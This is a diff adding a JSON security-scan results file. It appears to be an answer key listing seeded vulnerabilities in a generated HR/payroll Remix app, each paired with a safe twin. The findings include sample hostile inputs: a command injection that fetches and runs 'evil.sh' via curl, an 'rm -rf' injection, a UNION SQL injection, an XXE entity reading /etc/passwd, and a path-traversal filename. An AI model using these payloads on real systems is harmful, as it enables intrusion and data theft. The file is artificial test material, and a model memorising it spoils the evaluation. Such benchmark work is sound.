@@ -1,0 +1,587 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "javascript.security.injection.command-injection-execsync",
+      "path": "generated-hr-payroll-remix/app/routes/policies.$id.tsx",
+      "start": {
+        "line": 90,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 90,
+        "col": 55,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`binderFormat` comes straight from the `binder_format` query parameter (see loader, line 148-151) with no allowlist check, and is concatenated into a shell command string passed to `execSync`. Any authenticated user can inject shell metacharacters (e.g. `binder_format=pdf;curl+evil.sh|sh#`) to execute arbitrary OS commands on the server. Contrast with the safe twin `stageDocumentForPrintShop` in documents.$id.tsx, which validates the format against `SUPPORTED_BINDER_FORMATS` and uses `spawnSync` with an argv array and `shell:false`.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.command-injection-shell-spawn",
+      "path": "generated-hr-payroll-remix/app/routes/admin.export.tsx",
+      "start": {
+        "line": 20,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 34,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`convertExportToLegacyLayout` builds a shell command string with the user-supplied `legacyOutputType` form field interpolated directly into it and runs it with `spawn(cmd, {shell: true})`. No allowlist is applied. An hr_admin/payroll_specialist supplying a `legacyOutputType` like `csv; rm -rf /tmp/x #` achieves arbitrary command execution. The adjacent `convertExportToStandardFormat` (line 43-61) is the safe twin: it validates against `STANDARD_EXPORT_FORMATS` and calls `spawn` with an argv array and `shell:false`.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.code-injection-new-function",
+      "path": "generated-hr-payroll-remix/app/routes/compensation.new.tsx",
+      "start": {
+        "line": 29,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 34,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`previewBonusFormula` reads the `bonus_formula` query parameter and passes it straight into `new Function(\"salary\", `return ${formula};`)`, then invokes the resulting function. This executes arbitrary attacker-supplied JavaScript in the Node.js server process (manager/hr_admin role required, but full RCE-equivalent code execution in-process, able to reach `process`, `require`, filesystem, etc. via the Function constructor's global scope).",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Improper Control of Generation of Code ('Code Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.sql-injection-raw-sql",
+      "path": "generated-hr-payroll-remix/app/routes/admin.audit-log.tsx",
+      "start": {
+        "line": 16,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 23,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`fetchAuditLogsInDateRange` builds a raw SQL string with `sql.raw()` and interpolates the `from`/`to` query parameters directly into the `WHERE` clause without any parameterization or escaping, unlike every other query in this file which uses Drizzle's query builder. An hr_admin-authenticated request such as `/admin/audit-log?from=2024-01-01'+UNION+SELECT+...--&to=2024-12-31` is injected verbatim into the executed SQL.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-89: SQL Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authn.forged-service-token-no-signature-check",
+      "path": "generated-hr-payroll-remix/app/routes/payroll.callback.ts",
+      "start": {
+        "line": 17,
+        "col": 20,
+        "offset": 0
+      },
+      "end": {
+        "line": 17,
+        "col": 51,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`resolveProviderConfirmation` decodes the bearer token with `readServiceTokenClaims`, which explicitly does NOT verify the HMAC signature (see serviceToken.ts: 'Reads the claim set out of a compact token without checking the signature'). Any external caller can POST an unsigned, self-crafted token (e.g. `base64(header).base64({\"compensationId\":5,\"status\":\"applied\"}).anything`) to `/payroll/callback` and flip any compensation record to 'effective', bypassing the entire manager/HR approval workflow. Compare to directory.sync-events.ts, which correctly calls `verifyServiceToken(token, secret)` with signature verification for the analogous callback.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-347: Improper Verification of Cryptographic Signature",
+            "CWE-306: Missing Authentication for Critical Function"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.xxe.entity-expansion-file-read",
+      "path": "generated-hr-payroll-remix/app/lib/legacyArchiveIndex.ts",
+      "start": {
+        "line": 20,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 46,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`expandDeclaredEntities` parses `<!ENTITY name SYSTEM \"path\">` declarations out of attacker-supplied XML and reads the referenced path from the local filesystem with `fs.readFileSync`, inlining the contents wherever the entity is referenced. `parseArchiveExport` (which uses this unsafe path) is called from `documents.tsx`'s `loadCachedLegacyRecords` (line 15-25) on the fully client-controlled `legacyArchiveCache` cookie, with no authentication beyond a normal session and no integrity check on the cookie. An attacker can set a cookie containing `<!DOCTYPE x [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>...&xxe;...` to read arbitrary local files into the parsed record fields. The safe twin, `parseTrustedArchiveExport`, explicitly rejects any DOCTYPE and is used only for the hr_admin-uploaded import path (admin.import.tsx).",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-611: Improper Restriction of XML External Entity Reference"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.server-side-template-injection-handlebars",
+      "path": "generated-hr-payroll-remix/app/routes/admin.departments.tsx",
+      "start": {
+        "line": 16,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 19,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`previewDepartmentAnnouncement` compiles the `draft_template` query parameter directly as a Handlebars template with `Handlebars.compile(draftTemplate)` and renders it. Handlebars template syntax allows helper invocation and, via known gadget chains, prototype pollution / arbitrary code execution. The safe twin `renderDepartmentAnnouncement` (line 101-107) only ever compiles a fixed, hardcoded template string and treats caller input strictly as data, never as template markup \u2014 confirming the preview path is the seeded flaw.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine",
+            "CWE-94: Improper Control of Generation of Code ('Code Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.unsanitized-upload-filename",
+      "path": "generated-hr-payroll-remix/app/routes/documents.upload.tsx",
+      "start": {
+        "line": 88,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 95,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The uploaded file's client-supplied name (`file.name`) is used unsanitized to build `fileName`/`filePath`, which is then passed to `writeFile`. A crafted multipart request with a filename like `../../../../tmp/evil.cron` escapes `uploadDir` via `path.join`'s traversal resolution, allowing an authenticated user to write files to arbitrary locations on the server filesystem.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.ssrf.unrestricted-fetch-user-url",
+      "path": "generated-hr-payroll-remix/app/routes/documents.upload.tsx",
+      "start": {
+        "line": 43,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 47,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`fetchDocumentFromSource` performs `fetch(sourceUrl)` on the `sourceUrl` form field with no scheme/host allowlist, and the result is stored and later served back as a document. An authenticated employee can supply an internal URL (e.g. cloud metadata endpoint or internal admin service) to make the server issue requests to internal-only resources and exfiltrate the response through the stored document. Compare to `forwardRequestToTicketingSystem` in notifications.ts, which enforces `ALLOWED_ESCALATION_HOSTS` before making any outbound request.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-918: Server-Side Request Forgery (SSRF)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.mass-assignment-json-patch",
+      "path": "generated-hr-payroll-remix/app/routes/requests.$id.tsx",
+      "start": {
+        "line": 71,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 78,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`applyTicketTriagePatch` parses the raw JSON request body and applies every key directly to `db.update(hrRequests).set(patch)` with no field allowlist. It is invoked from `action()` (line 89-94) for any `application/json` POST to `/requests/:id`, gated only by `getUserId` \u2014 no role or ownership check. Any authenticated employee can PATCH any other employee's HR request and rewrite arbitrary columns (status, assignedToId, employeeId, etc.). The analogous `applyCompensationNotePatch` in compensation.$id.tsx is the safe twin: it restricts writable fields to `ALLOWED_TRIAGE_NOTE_FIELDS = new Set([\"notes\"])`.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes",
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.mass-assignment-form-edits",
+      "path": "generated-hr-payroll-remix/app/routes/requests.$id.tsx",
+      "start": {
+        "line": 195,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 205,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`applyRequestEdits` takes every posted form field (minus `intent`) and writes it directly onto the `hrRequests` row via `db.update(...).set(edits)`, with no allowlist and no role/ownership check on the caller relative to `reqId`. Reached via `intent=\"update-details\"` in `action()` (line 185-187), which only requires a valid session \u2014 any employee can rewrite any field of any HR request, including ones that belong to other employees.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.missing-role-check-status-update",
+      "path": "generated-hr-payroll-remix/app/routes/tasks.$id.tsx",
+      "start": {
+        "line": 138,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 147,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The status-update branch of `action()` updates `onboardingTasks.status` for the task identified by `params.id` with only a session check (`getUserId`) \u2014 no verification that the caller is the task's owner, the owning manager, or hr_admin. The UI only renders Approve/Reject buttons for isAdmin/isManager, but the endpoint itself enforces nothing, so any authenticated employee can POST `status=approved` (or `rejected`/`waived`) for any other employee's onboarding task. Contrast with `applyOnboardingTaskEdits` (line 92-123) in the same file, the safe twin, which explicitly checks `isAdmin || isOwningManager` before allowing edits.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authn.trusted-header-spoofing",
+      "path": "generated-hr-payroll-remix/app/routes/compensation.summary.tsx",
+      "start": {
+        "line": 49,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 54,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`resolveGatewayAccountId` derives the authenticated identity purely from the client-supplied `x-account-id` request header, with no signature, HMAC, or other proof that the request actually passed through the trusted payroll gateway. Any external client can set this header directly to view or filter (via `buildFilteredCompensationDigest`) any employee's compensation records by ID, a full authentication bypass / IDOR on this route.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-290: Authentication Bypass by Spoofing",
+            "CWE-639: Authorization Bypass Through User-Controlled Key"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.idor-filter-scope-override",
+      "path": "generated-hr-payroll-remix/app/routes/requests.summary.tsx",
+      "start": {
+        "line": 30,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 32,
+        "col": 60,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`buildCustomRequestDigest` builds `filter = { employeeId: emp.id, ...criteria }` where `criteria` is the fully client-controlled parsed JSON body with no field restriction. Because object spread lets later keys win, a caller can include `\"employeeId\"` in the posted JSON to override the intended own-employee scope and retrieve any other employee's HR requests. The comment above this function claims parity with compensation.summary.tsx's digest, but that version (buildFilteredCompensationDigest) explicitly restricts merged fields to `ALLOWED_COMPENSATION_FILTER_FIELDS` \u2014 this one does not.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-639: Authorization Bypass Through User-Controlled Key"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.idor-unverified-preview-cookie",
+      "path": "generated-hr-payroll-remix/app/routes/dashboard.tsx",
+      "start": {
+        "line": 24,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 32,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`resolveDashboardSubject` extracts the second `.`-delimited segment of the client-supplied `portal_preview` cookie and uses it directly as the subject employee's user ID, with no verification that a legitimate preview grant was ever issued for it. Any authenticated user can set `portal_preview=x.<victim_user_id>` to load another employee's dashboard stats and recent notification titles/messages. Compare to `resolvePreviewGrant` in employees.$id.tsx, the safe twin, which validates the preview pass against a recorded audit-log entry before honoring it.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-639: Authorization Bypass Through User-Controlled Key"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.ldap-injection-unescaped-filter",
+      "path": "generated-hr-payroll-remix/app/routes/employees.new.tsx",
+      "start": {
+        "line": 16,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 20,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`findStaffByEmail` builds the LDAP-style filter `(mail=${email})` with the raw, unescaped `email` form field. Supplying a wildcard value such as `*` matches every directory entry, bypassing the intended 'this email must exist in the corporate directory' gate for creating a new employee record. The corporateDirectory module exports `escapeLdapFilterValue` for exactly this purpose and it is used correctly in admin.users.tsx's `verifyGroupAccess` (line 17-19), but not here.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-90: Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.xss.stored-xss-unescaped-html-interpolation",
+      "path": "generated-hr-payroll-remix/app/routes/documents.$id.tsx",
+      "start": {
+        "line": 38,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 48,
+        "col": 3,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`renderDocumentCoverSheet` builds a `text/html` response by interpolating `doc.title` and `doc.description` directly into the HTML (and into an inline `<script>` block) with no escaping. Both fields are attacker-controlled at upload time (documents.upload.tsx `title`/`description` form fields). Viewing `/documents/:id?format=print` executes any injected markup/script in the viewer's session. The sibling `renderPolicyCoverSheet` in policies.$id.tsx is the safe twin: it wraps every interpolated value in `escapeHtml`, imported from `~/lib/html` but never used here.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.xpath-injection-unescaped-title",
+      "path": "generated-hr-payroll-remix/app/routes/documents.$id.tsx",
+      "start": {
+        "line": 24,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 27,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`findArchivedDocumentByTitle` builds the XPath-like query `/archive/record[@employeeRef='...' and @title='${title}']` using the raw `title` query parameter (from `documents/:id?title=...`). A value containing a single quote breaks out of the intended predicate and can inject additional `and`-joined clauses, altering which archived record is matched. The sibling `findArchivedPolicyByTitle` in policies.$id.tsx is the safe twin: it calls `escapeXPathString(title)` before building the same kind of expression; this function does not.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-643: Improper Neutralization of Data within XPath Expressions ('XPath Injection')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.crypto.weak-prng-for-security-token",
+      "path": "generated-hr-payroll-remix/app/routes/auth.reset-password.ts",
+      "start": {
+        "line": 28,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 28,
+        "col": 63,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The password-reset code is generated with `Math.random().toString(36).substring(2, 20)`, a non-cryptographic PRNG, and used as the sole secret bound to a session that lets the holder set an arbitrary account's new password (see `applyPasswordFromResetSession`). Math.random() output is predictable/reconstructable in V8 given enough samples, weakening the reset flow to a guessable-token account takeover. The sibling `auth.verify-email.ts` uses `crypto.randomInt(0, 1000000)` for its confirmation code, the correct cryptographically-appropriate approach.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-338: Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.cors.reflected-origin-with-credentials",
+      "path": "generated-hr-payroll-remix/app/routes/notifications.tsx",
+      "start": {
+        "line": 21,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 26,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`buildNotificationBadgeResponse` reflects the request's `Origin` header verbatim into `Access-Control-Allow-Origin` while also setting `Access-Control-Allow-Credentials: true`, allowing any external website to issue a credentialed cross-origin request (using the victim's session cookie) and read the authenticated unread-notification count. The analogous widget in policies.tsx (`buildPendingPolicyWidgetResponse`, line 32-37) is the safe twin: it only reflects the Origin if it is in a fixed `INTRANET_EMBED_ORIGINS` allowlist.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-942: Permissive Cross-domain Policy with Untrusted Domains",
+            "CWE-346: Origin Validation Error"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.prototype-pollution.unfiltered-object-assign",
+      "path": "generated-hr-payroll-remix/app/utils/notifications.ts",
+      "start": {
+        "line": 38,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 45,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`applyClientNotificationPreferences` parses the `x-notification-preferences` request header as JSON and applies it to the shared `notificationDeliveryConfig` object with an unfiltered `Object.assign`. A key of `__proto__` in the attacker-controlled JSON is copied via the object's inherited `__proto__` setter, overwriting the object's prototype chain. Reached from notifications.tsx's loader for hr_admin users (line 38-40). The sibling `applyClientViewPreferences` in viewConfig.ts is the safe twin: it explicitly skips `UNSAFE_CONFIG_KEYS` (`__proto__`, `constructor`, `prototype`) before merging.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-1321: Improper Protection against Prototype Pollution Attacks"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.dos.redos-user-controlled-regex",
+      "path": "generated-hr-payroll-remix/app/utils/reportIndex.ts",
+      "start": {
+        "line": 26,
+        "col": 9,
+        "offset": 0
+      },
+      "end": {
+        "line": 27,
+        "col": 60,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`matchesClause`'s `$regex` handling calls `new RegExp(String(val))` with a value taken from the caller-supplied filter document. Reached via `requests.summary.tsx`'s `buildCustomRequestDigest`, where `criteria` (and therefore any `$regex` pattern) comes directly from the unauthenticated-content POST body with no restriction. A pattern engineered for catastrophic backtracking (e.g. `(a+)+$`) against a matching field value can hang the event loop, denying service to all users.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-1333: Inefficient Regular Expression Complexity",
+            "CWE-400: Uncontrolled Resource Consumption"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.secrets.hardcoded-api-credential",
+      "path": "generated-hr-payroll-remix/app/utils/benefitsCarrier.ts",
+      "start": {
+        "line": 13,
+        "col": 7,
+        "offset": 0
+      },
+      "end": {
+        "line": 13,
+        "col": 66,
+        "offset": 0
+      },
+      "extra": {
+        "message": "A live-looking bearer token (`bc_live_9f3a1d7c5e8b2a4f6d0c9e1b3a5f7d90`) for the benefits carrier's API is hardcoded directly in source rather than sourced from an environment variable/secret store, unlike every other outbound integration in this codebase (payrollSync.ts, equipmentVendor.ts) which reads its credential from `process.env`.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
